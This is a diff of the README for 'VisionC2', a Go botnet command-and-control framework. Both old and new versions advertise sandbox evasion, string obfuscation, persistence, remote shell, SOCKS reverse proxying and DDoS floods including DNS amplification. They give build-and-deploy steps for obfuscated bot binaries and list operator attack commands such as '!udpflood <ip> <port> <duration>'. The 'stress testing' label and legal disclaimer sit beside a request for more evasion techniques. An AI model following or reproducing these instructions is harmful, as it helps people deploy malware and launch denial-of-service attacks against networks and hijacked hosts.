@@ -1,224 +1,212 @@
-# VisionC2 – Go Based Botnet Command & Control (C2) Framework
+# VisionC2 – Advanced Botnet Command & Control Framework
 
 ![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
 ![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
 
-**VisionC2** is an upgraded fork of [BotnetGo](https://github.com/1Birdo/BotnetGo.git) bringing new Anti Sandbox, TLS Encryption + HMAC Bot Auth, String Hiding, and more to come .
-
-> **Credit:** This project is based upon the incredible work of [1birdo](https://github.com/1Birdo) in the [BotnetGo](https://github.com/1Birdo/BotnetGo.git) project. Many of VisionC2's foundations come directly from that repository.
-
----
-<img width="799" height="930" alt="Screenshot 2026-01-20 210432" src="https://github.com/user-attachments/assets/9f254bcb-b824-432a-812e-6250f208dbc4" />
-
-
-## ⚡ Features
-
-### C2 Server
-
-- **TLS Encryption:** Secure bot-to-server communications
-- **Multi-User, Role-Based Auth:** Support for multiple admins/operators
-- **Real-Time Bot Management:** Live monitoring and control
-- **Centralized Attack Coordination:** Issue simultaneous botnet commands
-- **Persistence Handling:** Tracks and handles bot reconnections
-
-### Bot Client
-
-- **14+ CPU Architectures Supported**
-- **Anti-Sandboxing:** Multi-stage detection/evasion
-- **Persistence Mechanisms:** Multi-layered survival
-- **Remote Shell Execution:** Detach, stream, or normal shell execution
-- **Attack Capabilities**:
-  - UDP / TCP Flood
-  - HTTP Flood
-  - SYN / ACK Flood
-  - DNS Amplification
-  - GRE Flood
-  - HTTPS/CF/TLS BYPASS (WIP)
+**VisionC2** is an advanced botnet framework built in Go focused on network stress testing. It features end to end encryption, sophisticated anti-analysis techniques, as well as DDOS/RCE/SOCKS Modules with more features to come.
 
 ---
 
-## 🔧 Prerequisites
+### 🔐 **Military-Grade Security Stack**
+- **TLS 1.3 Encryption**: State-of-the-art encrypted communications
+- **HMAC Authentication**: Challenge-response authentication prevents impersonation
+- **Multi-User Role Management**: Four-tier permission system (Owner, Admin, Pro, Basic)
+- **Command Origin Tracking**: Every action is logged and attributed to specific users
+- **Automatic Data Obfuscation**: Sensitive outputs are Base64-encoded in transit
 
-### Requirements
+### 🛡️ **Advanced Anti-Detection**
+- **Sandbox Evasion**: Multi-stage detection of virtualized environments
+- **String Obfuscation**: Critical strings are hidden from static analysis
+- **Binary Protection**: UPX compression with string removal techniques
+- **Persistence Layers**: Multiple survival mechanisms across platforms
+- **Architecture-Agnostic**: 14+ CPU architectures supported seamlessly
 
-- **Go 1.21+** (build from source)
-- **UPX:** For binary compression
-- **OpenSSL:** For TLS certificate creation
-- **NoMoreUPX** (recommended): [UPX string removal](https://github.com/Syn2Much/upx-stripper)
+### 💼 **Professional Operations**
+- **SOCKS5 Proxy Integration**: Built-in reverse proxy tunneling for secure access
+- **Formatted Output System**: Clean, professional command results with visual hierarchy
+- **Real-Time Bot Analytics**: Live monitoring of bot health, architecture, and status
+- **Team Collaboration**: Multiple operators with defined permission levels
+- **Audit-Ready Logging**: Complete command history and user activity tracking
 
-### Install Dependencies
+---
 
-#### Ubuntu / Debian
+## ⚡ Core Capabilities
+
+### **Enterprise Command & Control**
+- **Role-Based Access Control**: Granular permissions for team-based operations
+- **Multi-User Administration**: Support for distributed security teams
+- **Real-Time Bot Management**: Live interaction with deployed agents
+- **Centralized Coordination**: Simultaneous command execution across entire networks
+- **Professional Interface**: Color-coded terminal with dynamic user indicators
+
+### **Advanced Attack Vectors**
+- **Network Stress Testing**: UDP/TCP/HTTP/SYN/ACK flood capabilities
+- **Protocol-Level Attacks**: DNS amplification and GRE flood techniques
+- **Secure Shell Access**: Remote command execution with encrypted output
+- **Proxy Tunneling**: Built-in SOCKS5 reverse proxy for secure access
+- **Persistent Operations**: Background execution and detach capabilities
+
+### **Bot Agent Features**
+- **Cross-Platform Compatibility**: Linux, Windows, macOS support
+- **Architecture Detection**: Automatic adaptation to 14+ CPU types
+- **Stealth Persistence**: Multiple installation and survival methods
+- **Encrypted Communications**: TLS-protected command channels
+- **Resource-Aware Execution**: Minimal footprint with maximum capability
+
+---
+
+## 🏗️ Architecture Overview
+
+VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:
+
+```
+┌─────────────────┐    TLS 1.3    ┌─────────────────┐
+│   Admin Console │◄──────────────►│    C2 Server    │
+│  (Multi-User)   │                │  (Go Backend)   │
+└─────────────────┘                └─────────────────┘
+                                         │ TLS 1.3
+                                         ▼
+┌─────────────────┐                ┌─────────────────┐
+│   Bot Agents    │◄───────────────┤  Bot Registry   │
+│ (14+ Architectures)│                │ & Management   │
+└─────────────────┘                └─────────────────┘
+```
+
+---
+
+## 🔧 Getting Started
+
+### Prerequisites
 
 ```bash
+# Install core dependencies
 sudo apt update
 sudo apt install -y golang-go upx-ucl openssl git
+
+# Optional: Enhanced binary protection
+git clone https://github.com/Syn2Much/upx-stripper
 ```
 
-#### CentOS / RHEL
+### Quick Deployment
 
 ```bash
-sudo yum install -y golang upx openssl git
-```
-
----
-
-## 📜 TLS Certificate Setup
-
-VisionC2 requires TLS certificates to secure bot communication.
-
-### Option A: Self-Signed Certificate (Dev/Testing)
-
-```bash
-openssl genrsa -out server.key 2048
-openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
-openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
-chmod 600 server.key
-chmod 644 server.crt
-```
-
-### Option B: Let’s Encrypt (Production)
-
-```bash
-sudo apt install certbot
-sudo certbot certonly --standalone -d yourdomain.com
-```
-
-Certificates will appear in:  
-`/etc/letsencrypt/live/yourdomain.com/`
-
----
-
-## 🚀 Quick Start
-
-### 1. Clone the Repository
-
-```bash
+# Clone and setup
 git clone https://github.com/Syn2Much/VisionC2.git
 cd VisionC2
+
+# Generate secure certificates
+openssl genrsa -out server.key 4096
+openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365 \
+  -subj "/C=US/O=Security Research/CN=visionc2.local"
+
+# Configure your environment
+cd cnc
+# Edit main.go with your server details
+go run .  # First run creates admin user
 ```
 
-### 2. Configure the C2 Server
-
-Edit `cnc/main.go`:
-
-```go
-const (
-    USER_SERVER_IP   = "YOUR_SERVER_IP"
-    BOT_SERVER_IP    = "YOUR_SERVER_IP"
-    USER_SERVER_PORT = "420"
-    BOT_SERVER_PORT  = "443"
-)
-```
-
-Update protocol settings:
-
-```go
-const (
-    MAGIC_CODE       = "CHANGE_ME"
-    PROTOCOL_VERSION = "v1.0"
-)
-```
-
-### 3. Configure the Bot
-
-Edit `bot/main.go`:
-
-```go
-const gothTits = "OBFUSCATED_C2_STRING"
-```
-
-Generate the obfuscated string:
-
-```bash
-python3 tools/obfuscate_c2.py "YOUR_C2_IP:443"
-```
-
-Replace both `gothTits` and `requestMore()` with the output.
-
-### 4. Build Bot Binaries
+### Bot Deployment
 
 ```bash
 cd bot
+# Configure your C2 endpoint
+python3 tools/obfuscate_c2.py "1.2.3.4:443"
+
+# Build for multiple architectures
 chmod +x build.sh
 ./build.sh
 ```
 
-### 5. Run the C2 Server
+---
+
+## 🎯 Professional Usage Examples
+
+### Team-Based Security Operations
 
 ```bash
-cd cnc
-go run .
-```
+# Owner-level administration
+[Owner@admin]► db                    # Manage user database
+[Owner@admin]► !shell netstat -tlnp  # System reconnaissance
 
-A default `users.json` will be created on the first run.
+# Admin-level bot management  
+[Admin@operator1]► persist           # Establish persistence
+[Admin@operator1]► !info             # Gather intelligence
 
-### 6. Connect to the Admin Interface
+# Pro-level tactical operations
+[Pro@analyst]► !socks 1080          # Setup proxy tunnel
+[Pro@analyst]► !shell whoami        # Identity verification
 
-```bash
-nc YOUR_SERVER_IP 420
-# or
-telnet YOUR_SERVER_IP 420
-```
-
-> Enter your secret key (e.g., `spamtec`) to trigger the login screen—change `spamtec` to any secret string in main.go under `MAGIC_CODE`.
-
----
-
-## 🛠️ Admin Commands
-
-### Bot Management
-
-```
-bots           # List bots
-!info          # More info
-!persist       # Persistence control
-!reinstall     # Force reinstall
-!lolnogtfo     # Remove/uninstall
-```
-
-### Attack Commands
-
-```
-!udpflood <ip> <port> <time>
-!tcpflood <ip> <port> <time>
-!http <ip> <port> <time>
-!syn <ip> <port> <time>
-!ack <ip> <port> <time>
-!gre <ip> <port> <time>
-!dns <ip> <port> <time>
-```
-
-### System / Shell
-
-```
-!shell <cmd>
-!stream <cmd>
-!detach <cmd>
-clear   | cls
-help    | ?
-ongoing
-logout  | exit
+# Basic-level distributed testing
+[Basic@tester]► !udpflood 192.168.1.1 80 60
 ```
 
 ---
+## 🛠️ Command Reference
 
-## ⚖️ Legal & Ethical Notice
+### User Management
+- `help` - Context-aware help system (shows available commands)
+- `db` - User database management (Owner only)
+- `private` - Specialized commands based on clearance level
 
-This software is for **educational and authorized security research only**.
+### Bot Operations
+- `bots` - List all active agents with detailed status
+- `!<botid> <command>` - Target specific agent
+- `!info` - Comprehensive system intelligence
+- `!persist` - Enhanced persistence mechanisms
+- `!reinstall` - Agent redeployment
+- `!lolnogtfo` - Secure agent removal
 
-By using VisionC2 you agree to:
+### Network Operations  
+- `!socks <port>` - Establish SOCKS5 reverse proxy
+- `!stopsocks` - Terminate proxy connections
+- `!shell <command>` - Secure remote execution
+- `!detach <command>` - Background process execution
+- `!stream <command>` - Real-time output streaming
 
-1. Obtain explicit permission before testing or deployment
-2. Follow all applicable laws
-3. Take full responsibility for any use of the code
-4. Never use for malicious or unauthorized purposes
+### Stress Testing
+- `!udpflood <ip> <port> <duration>`
+- `!tcpflood <ip> <port> <duration>`
+- `!http <ip> <port> <duration>`
+- `!syn/!ack/!gre/!dns` - Protocol-specific attacks
 
 ---
 
-## 📧 Contact
+## ⚖️ Responsible Usage
 
-[dev@sinners.city](mailto:dev@sinners.city)
+**VisionC2 is exclusively for:**
+- Authorized penetration testing
+- Security research and education
+- Red team operations with proper authorization
+- Defensive security training and preparation
 
+**Strictly Prohibited:**
+- Unauthorized network access
+- Malicious attacks without permission
+- Violation of laws or regulations
+- Harmful or disruptive activities
+
+All users must obtain explicit written permission before deployment and assume full legal responsibility for their actions.
+
+---
+
+## 🤝 Community & Support
+
+### Contributing
+We welcome contributions from security professionals:
+- Code improvements and optimizations
+- Additional evasion techniques
+- Enhanced security features
+- Documentation and examples
+
+### Acknowledgments
+Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo
+
+---
+
+## 📧 Professional Inquiries
+
+For authorized security research, educational use, or professional consultation:
+
+**[dev@sinners.city](mailto:dev@sinners.city)**
 ---
